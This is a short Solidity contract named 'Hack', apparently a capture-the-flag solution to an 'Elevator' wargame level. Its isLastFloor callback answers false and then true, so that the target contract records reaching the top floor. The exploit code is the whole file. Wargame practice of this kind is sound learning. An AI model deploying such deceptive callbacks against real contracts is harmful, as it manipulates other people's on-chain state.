//SPDX-License-Identifier: MIT
pragma solidity^0.8;

interface IElevator {
    function goTo(uint256) external;
    function top() external view returns(bool);
}

contract Hack{
    IElevator private immutable contractAddress;
    uint256 count;

    constructor(address _contractAddress) {
        contractAddress = IElevator(_contractAddress);
    }

    function pwn() external {
        contractAddress.goTo(1);
        require(contractAddress.top(),"not top");
    }

    function isLastFloor(uint256) external returns(bool){
        count++;
        return count > 1;
    }
}